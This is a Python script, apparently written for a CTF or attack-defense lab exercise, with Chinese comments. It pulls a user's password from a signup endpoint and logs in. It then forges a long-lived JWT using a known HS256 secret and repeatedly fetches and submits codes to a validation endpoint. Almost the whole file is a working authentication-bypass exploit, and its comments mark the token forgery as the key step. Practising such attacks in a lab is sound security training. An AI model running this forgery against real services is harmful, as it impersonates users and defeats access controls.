
import requests
import json
import time
import jwt

import config

from datetime import datetime

token = ""
success=0
username= "dailin"
password = ""


def get_password(username):
    user_name = {'username': username}
    print("getting user data...")
    res= json.loads(requests.post(url=config.signup_url, data=user_name).text)
    if "password" in res:
        print("get user password:"+res["password"])
        return res["password"]
    elif "message" in res:
        err = res["message"]
        raise requests.exceptions.ConnectionError(err)  # return "message" is due to servers' status not good(status 1 or 3)

#上面是获得用户的信息（密码）( º﹃º )

def login(username,password):
    global token
    user_data = {
        'username': username,
        'password': password
    }
    res = json.loads(requests.post(url=config.login_url, data=user_data).text)
    if "token" in res.keys():
        print("login:"+res["token"][:15])
        token = res["token"]
    elif "Err" in res.keys() and res["Err"] == "You can't Login so many times":
        print("finding token from token file...")
        with open(config.token_file,"r") as f: # because login limit , find session from local file
            token = f.read()
        print("find token:"+token[:15]) #
#上面是用来登录

def fake_token():
    global token
    decoded_payload = jwt.decode(token,config.secrets_key, algorithms=['HS256'])
    new_exp=decoded_payload["exp"]+1000000
    new_payload={"name": "111","exp": new_exp}
    token = jwt.encode(new_payload, config.secrets_key, algorithm='HS256')
    print("fake a new token:"+token[:15])
    with open(config.token_file, 'w') as f:
        f.write(token)
#（关键）上面是通过已知的密钥，伪造长时间有效token。

def get_and_post_code(token):
    headers={
        "Authorization": "Bearer "+token 
    }
    for i in range(config.max_retries):
        try:
            res=json.loads(requests.get(config.info_url,headers=headers).text)
            if "message" in res:
                err =res["message"]
                raise requests.exceptions.ConnectionError(err)
            else:    
                code = res["code"]
                print("get code:"+code)
                headers = {"Authorization": "Bearer " + token}
                data = {"code": code}
                res = json.loads(requests.post(config.validate_url, headers=headers, data=data).text)
                print(res)
                break
        except requests.exceptions.ConnectionError as e:
            if "Connection refused" in str(e):
                e = "Connection refused"
            print("can't post due to network error:" + str(e))
            print("try again...")
            time.sleep(config.beat_delay)
            continue
        except Exception as e:
            log_and_print(config.log_file,"occur unexpected error:" + str(e))

#（关键）当服务器出现问题时，重复提交请求，保证获得和提交code,并且提交。

def log_and_print(file_name:str ,content):
    current_time = datetime.now().strftime('%Y-%m-%d-%H:%M:%S ')
    with open(file_name, 'a') as logfile:
        logfile.write(current_time + str(content) + '\n')
    print(content)

if __name__ == "__main__":
    for i in range(config.max_retries):
        try:
            password=get_password(username)
            login(username,password)
            fake_token()
            break
        except requests.exceptions.ConnectionError as err:
            if "Connection refused" in str(err):
                err="Connection refused"
            print("can't login due to network error:"+str(err))
            print("try again...")
            time.sleep(config.beat_delay)
            continue
        except FileNotFoundError:
            print("token file not found,please restart the NMS.")
            raise "Servers Error"
        except Exception as e:
            log_and_print(config.log_file,"occur unexpected error:" + str(e))
    #获得长时间有效token

    while success < config.post_target:
        get_and_post_code(token)
        success += 1
        print(f"it is the {success} success!!!")
        time.sleep(config.code_fresh)
    #提交10次不同的code

# 应该可以跑起来吧 (｡ŏ_ŏ)